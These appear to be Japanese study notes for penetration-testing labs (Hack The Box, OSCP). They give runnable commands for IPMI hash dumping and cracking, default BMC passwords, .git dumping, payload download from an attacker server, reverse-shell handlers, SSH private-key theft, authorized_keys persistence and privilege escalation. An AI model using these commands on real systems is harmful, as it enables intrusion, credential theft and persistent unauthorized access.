		- 通信インターフェース - ローカルシステムインターフェース、シリアルおよびLANインターフェース、ICMBおよびPCI管理バス
	- 内部ペネトレーションテストでの注意点
		- IPMI を見落とさないことが重要（多くの環境で脆弱性が見つかっている）。
		- BMC の Web コンソールにアクセス可能になるケースは高リスクにつながる。
		- 環境によっては、解読可能だが一応ユニークなパスワードを設定し、それを他のシステムでも再利用している事例がある。
		- 実際のペネトレーションテストでは、IPMI ハッシュを入手してオフラインで Hashcat により解読し、root ユーザとして複数の重要サーバに SSH 接続できたり、各種ネットワーク監視ツールの Web 管理コンソールにもアクセスできた例がある。

### 情報収集(コマンド)
- IPMIはポート623 UDPを介して通信する
- IPMIプロトコルを使用するシステムは、ベースボード管理コントローラ（BMC）
- BMCは通常、Linuxを実行する組み込みARMシステムとして実装され、ホストのマザーボードに直接接続される
- 内部侵入テストでよく見られる最も一般的なBMCは、HP iLO、Dell DRAC、およびSupermicro IPMIである。
- 評価中にBMCにアクセスできれば、ホストのマザーボードに完全にアクセスでき、ホストオペレーティングシステムの監視、再起動、電源オフ、または再インストールもできる
- BMCへのアクセスを得ることは、システムへの物理的なアクセスとほぼ同じ
	- 激アツ！！！！
	- 多くのBMC（HP iLO、Dell DRAC、Supermicro IPMIを含む）
		- Webベースの管理コンソール、TelnetやSSHなどのコマンドラインリモートアクセスプロトコル、およびIPMIネットワークプロトコル用のポート623 UDPを公開している

#### スキャン
- Nmap
	- UDPであることに注意！！！
- 末尾のホスト名を探さないといけないから、Metasploitの方がやりやすいかも
```shell-session
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

- Metasploit
```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
```

#### ログイン
デフォルトの認証情報でログインできる場合
- 内部侵入テストでは、管理者がデフォルトのパスワードを変更していないBMCがよく見つかる
- それぞれのデフォルトパスワード
	- あと、IPMSがこれでログインできたら、他のsshとかもこれでログインできる可能性あるから試す。

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |

デフォルトの認証情報でログインできない場合
- IPMI 2.0 の RAKP プロトコルに存在する脆弱性を利用できる
	- IPMIは、認証プロセス中に、サーバがユーザのパスワード（ソルト付きの SHA1 または MD5 ハッシュ）を認証前にクライアントへ送信する。
	- この仕組みを悪用すると、BMC 上の「有効な任意のユーザアカウント」のパスワードハッシュを取得できる。
	- 取得したパスワードハッシュは、Hashcat（モード 7300）を使った辞書攻撃でオフライン解析が可能。
	- この脆弱性は修正されない
		- この問題は IPMI 仕様の根幹部分に起因するため、直接的な“修正”は行えない。
		- 対策としては、極めて長く解読が困難なパスワードを設定するか、BMC への直接アクセスをネットワークセグメンテーションで制限することなどが考えられる。
	- HP iLO で工場出荷時のデフォルトパスワードを使っているケース
		- 8文字の大文字と数字の組み合わせを総当たりする際、以下のコマンド（マスク攻撃）などが有効↓
```sh
echo 'HASH' > ipmi.txt

hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

IPMI ハッシュを取得するには、Metasploit [IPMI 2.0 RAKP Remote SHA1 パスワード ハッシュ検索](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)モジュールを使用できる
```shell-session
use auxiliary/scanner/ipmi/ipmi_dumphashes 
```

なんかうまく行かない時は、このツールも使えるらしい
https://github.com/c0rnf13ld/ipmiPwner
- 準備
```sh
sudo apt-get update
sudo apt-get install ipmitool -y
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

```

- 実行
```sh
python3 ipmipwner.py --host 192.168.1.12 -uW /home/user/User.txt -c john -pW /usr/share/wordlists/rockyou.txt -oH ipmi_hash
```


認証情報わかったら、
以下の2つでログインできる
 - Webコンソール
	- iLO/BMC の IPアドレス (またはホスト名) をブラウザに入力
	    例: `https://<BMCのIPアドレス>/`  
	    HP iLO の場合は、`https://<iLO IP or hostname>/` など。
	- ログイン画面が表示されたら、ユーザー名 (ID) とパスワードを入力
	- ログイン後、サーバのリモート管理や電源操作、設定確認などが可能
	    - GUI ベースの操作が中心です。
 - CLIツール
	 - ipmitool
```sh
sudo apt-get update
sudo apt-get install ipmitool
```

```sh
ipmitool -I lanplus -H <BMCのIPアドレス> -U <ユーザー名> -P <パスワード> chassis power status
```




---
# 脆弱性の探索

### .Gitが見つかったら

- .gitがあったら、.git/logs/HEADを参照したら、remoteのurl出てきたりすることがある
- GitHackを使って、gitファイルをダンプする
	- [https://github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack)
```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
python GitHack.py http://www.openssl.org/.git/
```

### XSS (Cross Site Script)

HTBやOSCPではXSSの脆弱性を使うことはないため、真っ先に除外する。  
XSSは他のユーザーが引っかかる必要があるが、HTBやOSCPには対象が存在しない。
- わけではないこともあることがわかった。SeaはXSSからのRCEで侵入できる。

### Searchsploit
#### 複数の脆弱性を見つけたとき
 .txtよりもコードが書かれた脆弱性を選ぶべき
 迷った時は数字が後の方の方を選ぶべし
	 より最新で、上手くいく可能性が高いから

- searchsploitでExploitDBのリンクも表示するオプション
- でも、これつけるとローカルでの場所が表示されなくなっちゃう😢
  ```bash
  searchsploit -w <検索キーワード>
  ```
#### PoCをダウンロードしたい時
 searchsploit -m <脆弱性の番号>
  - -m : ミラー
#### 使い方だけ出力したい
	 | grep -i usage <PoC file>

- Authenticated~系は、攻撃者がログインした後にできる攻撃なので、ログインしてないと無理
### Searchsploitだけで全てだと思わない。Google検索もする
検索キーワード　: `SoftwareName Version CVE`




---

## Exploit

### 侵入のための足がかり
#### ステガノグラフィーツール
CTFでは、意味ありげな画像がポンと渡されて、何も情報がない場合、ステガノグラフィーのこともある。

ファイルの埋め込み
```bash
steghide embed -cf cvr.jpg -ef emb.txt
```
データの抽出:
```bash
steghide extract -sf stg.jpg
```
##### パスフレーズがかかってて、突破できない時
8. 何が入ってるのかを確認する
```bash
sudo apt install stegcracker -y
sudo apt install steghide -y
sudo steghide info *.jpg
```
9. 何も入力しないでEnterを押すことで突破できないか試す
```bash
sudo steghide extract -sf *.jpg
```
10. ヒントの確認
	- 隠されたパスフレーズがファイルのメタデータや埋め込まれたコメントに含まれている場合がある。以下のコマンドでチェック
```bash
strings HackerAccessGranted.jpg
exiftool HackerAccessGranted.jpg
```

1. 辞書攻撃
	- よく使用される辞書ファイル
	- `rockyou.txt`（多くのステガノグラフィー攻撃で利用される）
```bash
stegcracker HackerAccessGranted.jpg /path/to/wordlist.txt
```
 
#### 文字の画像などでモザイクがかかってて複合したい時
 - [https://github.com/spipm/Depix.git]を使う
 ```sh
git clone https://github.com/spipm/Depix.git
cd Depix
 ```

```
python3 depix.py -p <PATHTOIMAGE>/image.png -s
./images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o
<DESIREDPATH>/output.png
```
#### 攻撃者側のサーバー内のファイルをやられ側に移す
##### PythonでHTTP

 ```bash
python3 -m http.server 8080
 ```

  攻撃者サーバーを一時的にwebサーバーとする

- wgetとかcurlコマンドでダウンロード
```shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
```
```shell-session
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

##### SCPを使う
リモートホストでsshユーザー資格情報を取得した場合、`scp`を使用することでファイルのやり取りできる
```shell-session
snowyowl644@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh
```

##### Base64の使用
マシンによっては、ファイルをダウンロードするときにファイアーウォールがあって、正常にダウンロードできない時もある
簡単なトリックを使用してファイルを`base64`形式にエンコードし、`base64`文字列をリモートサーバーに貼り付けてデコードすることでファイルの受け渡しができる
↓shellというファイルをダウンロード
```shell-session
snowyowl644@htb[/htb]$ base64 shell -w 0
```
この`base64`文字列をコピーしてリモートホストに移動し、`base64 -d`を使用してデコードし、出力をファイルにパイプする
```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

#### SMTPサーバーを建てる
- Kali LinuxでSMTPサーバーを構築するには、Postfixなどのメールサーバーソフトウェアで立てる
まずインストールする
```bash
sudo apt update
sudo apt install postfix
```
簡単な設定する
```bash
sudo nano /etc/postfix/main.cf
```

```bash
myhostname = mail.example.com  # サーバーのホスト名
mydomain = example.com         # ドメイン名
myorigin = $mydomain
inet_interfaces = all          # 外部からの接続を許可
inet_protocols = ipv4          # IPv4のみを使用
mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain
mynetworks = 127.0.0.0/8       # 接続を許可するネットワーク（適宜変更）
relayhost =                    # リレー先（空の場合は直接送信）
```

設定を適用するためにPostfixの再起動する
```bash
sudo systemctl restart postfix
sudo systemctl enable postfix
```

####  johnを使いたい時
**単純なハッシュ**
2. hashes.txtに直す
```bash
echo "ハッシュ" > hashes.txt
```
3. ハッシュの形式を指定して、johnを使って解析
```bash
john --format=raw-sha512 hashes.txt
```

ハッシュの形式が不明な場合
```bash
hashid -m 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
```

**複雑な形式**
4. まず自分の目的に合ったjohnのスクリプトを探して、johnが解析できる.johnの形に変換する
```bash
sudo find / -iname *2john* -type f 2>/dev/null
```
5. johnでワードリストを指定して解析
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt 探したい.john
```


---
### リバースシェルの作成
- https://www.revshells.com/

### Metasploit 

#### リバースシェルリスナーの設置

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
set ExitOnSession false
exploit -j -z
```

#### **セッション管理**

#### **セッション一覧表示**

```bash
sessions -l
```

#### **セッション接続・セッションに戻る**

```bash
sessions -i <セッション番号>
```

####  **セッション全終了**
se
```bash
sessions -K
```

#### **特権昇格の発見とエクスプロイト**

##### **local_exploit_suggester を使う**

Mesterpreterでユーザー権限でセッションが確立している時、**`local_exploit_suggester`** モジュールを使用して、ターゲットシステムに適した特権昇格エクスプロイトを提案させることができます。

```bash
ls
```

---

### シェルアップデート
- linux
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- windows
- 方法 : rlwrap は、コマンドラインの入力履歴や補完機能を提供するラッパープログラムです。これを nc と組み合わせることで、シェルの機能を強化できます。

```bash
rlwrap nc -lvnp <ポート番号>  # リスナー側 (攻撃者マシン)
```

## Lateral Movement
リバースシェルで、ログインした時、最初は、「www-data」であることがある。
その時、www-dataのパスワードがわからないので横展開が必要

- データベース情報を書き換える・新規追加
	- ローカルの空いてるポート見つけるコマンド
		- `netstat -tuln`
	- データベースの種類を見分ける方法
		- **ポート番号3306**は、MySQLまたはMariaDBのデフォルトポート
		- **ポート番号:5432**:PostgreSQL

- HTBでの認証情報の使い回し
	- webのログインで取得したパスワードとサーバー上のユーザーが同じことがある
	- DBの設定ファイルにあるパスワードとsshのパスワードが同じ

- **`/etc/passwd` から有効なシェルを持つユーザーの確認**
	- `/etc/passwd` の最後のフィールドは、**そのユーザーのデフォルトシェル** を示している。  
	- `/bin/bash` ・`/bin/sh`
		-  ユーザーは、**通常のログインが可能**。
		- 横展開先のユーザーに最適
	- **`/usr/sbin/nologin`**
	    - このシェルが設定されているユーザーは、**ログインできない** ように制限されている。
	    - 例えば、`www-data` や `mysql` などのシステムユーザーに設定されている。
	- **`/bin/false`**
	    - これもログインを拒否するための設定。
	    - `false` コマンドは何もせず終了するため、**ログインを試みても即ログアウトする**。
	横展開先のユーザーを探す時に使える。



## 権限昇格
- 現在のユーザーで、sudo コマンドを使用して実行可能なコマンドや権限を確認する
```bash
sudo -l
```
- 正直HTBのEasyとかMediumの一部では、このコマンド打って、NoPasswordって書いてあるスクリプトをsudo権限で実行すれば権限昇格できる。
- たまに、SUIDが設定されているバイナリの脆弱性を使って権限昇格することもある
	- 以下のリストと照らし合わせて、ここにリストされてないユニークなバイナリがあったら、バージョン調べて、脆弱性を探してPoCを刺すこともできそう。

- SUIDで列挙した時に、一般的に設定されているバイナリ
	- そのため、注目すべきは、これ以外のバイナリってこと。
	- ほとんどの Linux でデフォルト設定されているもの
		- `/usr/bin/passwd`
		- `/usr/bin/su`
		- `/usr/bin/sudo`
		- `/usr/bin/mount`
		- `/usr/bin/umount`
		- `/usr/bin/newgrp`
		- `/usr/bin/chsh`
		- `/usr/bin/chfn`
		- `/usr/bin/gpasswd`
		- `/usr/bin/fusermount`
	- 特定の環境や、設定によって含まれることがあるバイナリ
		- `/usr/lib/openssh/ssh-keysign`
		- `/usr/lib/dbus-1.0/dbus-daemon-launch-helper`
		- `/usr/sbin/pppd`
		- `/usr/lib/xorg/Xorg.wrap`

- ここにまとまってるから、あとでまとめる
	- https://scrapbox.io/tadanomemo777/Linux_%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC

- 権限昇格で使えるチェックリスト
	- [HackTricks](https://book.hacktricks.xyz/) 
		- [Linux](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html) と [Windows](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html) の両方のローカル特権の昇格に関する優れたチェックリストである
	- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) 
		- [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) と [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) の両方のチェックリストがある

- 自動列挙ツール
	- 上記のコマンドの多くは、レポートを調べて弱点を探すためにスクリプトで自動的に実行される場合がある
	- 興味深い結果を返す一般的なコマンドを実行することで、多くのスクリプトを実行してサーバーを自動的に列挙できる
	- 一般的な Linux 列挙スクリプトには、[LinEnum](https://github.com/rebootuser/LinEnum.git) と [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) があり、Windows には [Seatbelt](https://github.com/GhostPack/Seatbelt) と [JAWS ](https://github.com/411Hall/JAWS)がある。
	- [Privilege Escalation Awesome Scripts SUITE（PEASS）](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
		- 最新の状態に保つために適切に維持されており、LinuxとWindowsの両方を列挙するためのスクリプトが含まれている
	しかし、自動列挙ツールはウイルス対策ソフトウェアまたはセキュリティ監視ソフトウェアをトリガーする可能性のある多くの「ノイズ」を生成するので、スクリプトの実行が妨げられたり、システムが侵害されたというアラームがトリガーされたりする可能性がある。場合によっては、スクリプトを実行する代わりに手動列挙を実行する必要がある。

これらのスクリプトの出力で、探すべき脆弱性
- カーネルエクスプロイト
	- 普通にバージョンが古いOSだと、パッチが当たってないから、脆弱性になりうる
- 脆弱なソフトウェア
	- linux : `dpkg -l`
		- インストールされているソフトウェアが、古いバージョンの時、脆弱性がある場合がある。
	- Windows : `C:\Program Files`以下を見る
- ユーザー権限
	- Sudo
		- `sudo -l`
			- (ALL : ALL) ALL 
				- `sudo`ですべてのコマンドを実行でき、完全なアクセス権を与え、`sudo`で`su`コマンドを使用してルートユーザーに切り替えることができると述べています。
			- (user : user) NOPASSWD: /bin/echo
				- `sudo`でコマンドを実行するにはパスワードが必要です。特定のアプリケーション、またはすべてのアプリケーションをパスワードなしで実行できる場合があり
	- SUID
		- SUID バイナリ (Set User ID) を検索して一覧表示する
		- `find / -type f -perm -04000 -ls 2>/dev/null`
	- Windows Token Privileges
		-  GTFOBins : https://gtfobins.github.io
		- Windows版 GTFOBins : https://lolbas-project.github.io/#


スケジュールされたタスク
- スケジュールされたタスク（Windows）またはcronジョブ（Linux）を利用して特権をエスカレーションするには、通常2つの方法があります。
	- 新しいスケジュールされたタスク/cronジョブを追加する
	- 悪意のあるソフトウェアを実行するように彼らをだます
	- 新しいスケジュールされたタスクを追加できるかどうかを確認する
		- /etc/crontab
		- /etc/cron.d
		- /var/spool/cron/crontabs/root
		- cronジョブによって呼び出されたディレクトリに書き込むことができれば、実行時にリバースシェルを送信するリバースシェルコマンドでbashスクリプトを記述できる

SSHキー
- 特定のユーザーの .ssh を読み取れるアクセス権がある場合
	- 以下のプライベート ssh キーを参照・コピー
		- `cat /root/.ssh/id_rsa`
		- `cat /user1/.ssh/id_rsa`
	- ローカルにペースト・権限を与える
		- `nano id_rsa`
		- `chmod 600 id_rsa`
	- ローカルから接続
		- `ssh root@94.237.53.117 -p 53658 -i id_rsa`

ユーザー`/.ssh/`ディレクトリへの書き込みアクセス権がある場合
- ユーザーのsshディレクトリの/home/user/.ssh/authorized_keysに公開鍵を配置
- 出力ファイルを指定するには、まず ssh-keygen と -f フラグで新しいキーを作成する
```shell-session
#攻撃者PC
ssh-keygen -f key
```
- `key`（`ssh -i`で使用します）と`key.pub`の2つのファイル
- `key.pub`をコピーして、リモートマシンで`/root/.ssh/authorized_keys`に追加
- 被害者PCで実行
```shell-session
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```
- これで、リモートサーバーは、秘密鍵を使用してそのユーザーとしてログインできるはず
```shell-session
snowyowl644@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 
```



---

## フラグの検索

- ファイル名が`user.txt`の場合

```bas
find / -type f -iname "user.txt" 2>/dev/null
```

- ファイル名が`root.txt`の場合

```bash
find / -type f -iname "root.txt" 2>/dev/null
```

`grep`を使用して特定の文字列を含むファイルを検索

もし、ディレクトリ内のファイルの中身を再帰的に検索する場合

- `user`という文字列を検索（大文字・小文字を無視）

```bash
grep -ri "user" / 2>/dev/null
```

- `root`という文字列を検索（大文字・小文字を無視）

```bash
grep -ri "root" / 2>/dev/null
```